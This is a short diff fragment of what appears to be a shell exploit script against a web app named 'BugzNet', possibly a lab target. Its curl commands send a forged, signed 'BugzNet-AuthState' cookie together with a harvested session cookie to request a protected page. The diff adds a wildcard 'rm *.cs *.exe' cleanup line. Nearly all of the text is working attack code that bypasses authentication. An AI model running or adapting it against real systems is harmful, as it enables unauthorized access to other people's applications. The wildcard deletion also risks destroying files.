@@ -53,3 +53,5 @@ curl -b $cookieJar -c $cookieJar "$rhost/Identity/Login?handler=Login" \
 curl -i "$rhost/Bugs" \
    -b "BugzNet-AuthState=$payload.$signature" \
    -b "BugzNet-Session=$(cat $cookieJar | grep BugzNet-Session  | awk '{print $NF}')" 
+
+rm *.cs *.exe
